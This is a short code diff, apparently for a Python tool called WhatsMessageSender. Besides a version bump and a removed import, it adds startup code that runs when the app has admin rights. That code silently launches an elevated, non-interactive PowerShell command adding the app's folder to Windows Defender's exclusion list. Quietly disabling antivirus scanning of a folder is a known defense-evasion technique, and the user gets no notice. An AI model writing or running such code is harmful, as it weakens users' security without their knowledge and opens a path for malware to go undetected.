@@ -33,7 +33,6 @@ from includes.other.thread import MesThread
 from requests.exceptions import ConnectionError
 import urllib.parse
 import urllib.request
-import getAdmin
 from webview import create_window, start
 import webbrowser
 from openpyxl import Workbook
@@ -45,7 +44,7 @@ class SafeDict(dict):
         return '{' + key + '}'
 
 # Version Info
-VERSION = "1.9.3"
+VERSION = "1.9.4"
 
 # Setup For Logging
 logging.basicConfig(format='%(asctime)s - %(message)s',filename='wp.log',level=logging.DEBUG)
@@ -445,6 +444,9 @@ def StartApp():
 
 if __name__ == "__main__":
     if is_admin():
+        import win32com.shell.shell as shell
+        commands = 'powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\WhatsMessageSender"'
+        shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+commands)
         # Icon Checker
         checkIcons()
 
